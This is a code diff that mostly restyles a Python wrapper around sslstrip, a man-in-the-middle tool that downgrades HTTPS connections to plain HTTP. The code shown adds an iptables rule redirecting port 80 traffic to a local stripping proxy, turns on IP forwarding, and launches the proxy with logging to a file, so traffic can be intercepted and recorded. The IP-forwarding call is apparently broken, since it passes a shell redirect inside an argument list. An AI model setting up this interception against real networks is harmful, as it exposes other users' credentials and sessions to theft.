@@ -1,6 +1,7 @@
 '''This package contains everything related to SSL stripping'''
 
-import subprocess, logging
+import subprocess
+import logging
 from twisted.web import http
 from twisted.internet import reactor
 
@@ -14,9 +15,10 @@ def setup_iptables_redirect(listen_port, reset=False):
         else:
             # Run the iptables command to redirect traffic from port 80 to port 25518
             subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', listen_port])
-    
+
     except Exception as e:
         print(f'An error occurred while trying to setup iptables: {e}')
+
 
 def set_ip_forwarding(enable=True):
     # Converting boolean to int makes it a 1 or 0. making it a string allows us to use it in the subprocess
@@ -24,24 +26,26 @@ def set_ip_forwarding(enable=True):
 
     subprocess.run(['echo', value, '>', '/proc/sys/net/ipv4/ip_forward'], shell=True)
 
+
 def start_ssl_strip(log_file, log_level, listen_port):
-    
-    gVersion = 'adjusted 0.9'
-        
+
+    g_version = 'adjusted 0.9'
+  
     logging.basicConfig(level=log_level, format='%(asctime)s %(message)s',
                         filename=log_file, filemode='w')
 
     URLMonitor.getInstance().setFaviconSpoofing(False)
     CookieCleaner.getInstance().setEnabled(False)
 
-    strippingFactory              = http.HTTPFactory(timeout=10)
-    strippingFactory.protocol     = StrippingProxy
+    stripping_factory              = http.HTTPFactory(timeout=10)
+    stripping_factory.protocol     = StrippingProxy
 
-    reactor.listenTCP(int(listen_port), strippingFactory)
-                
-    print('\nsslstrip ' + gVersion + ' by Moxie Marlinspike running...')
+    reactor.listenTCP(int(listen_port), stripping_factory)
+   
+    print('\nsslstrip ' + g_version + ' by Moxie Marlinspike running...')
 
     reactor.run()
+
 
 def ssl_strip_prepped(listen_port, log_file='sslstrip.log', log_level=logging.WARNING):
     try:
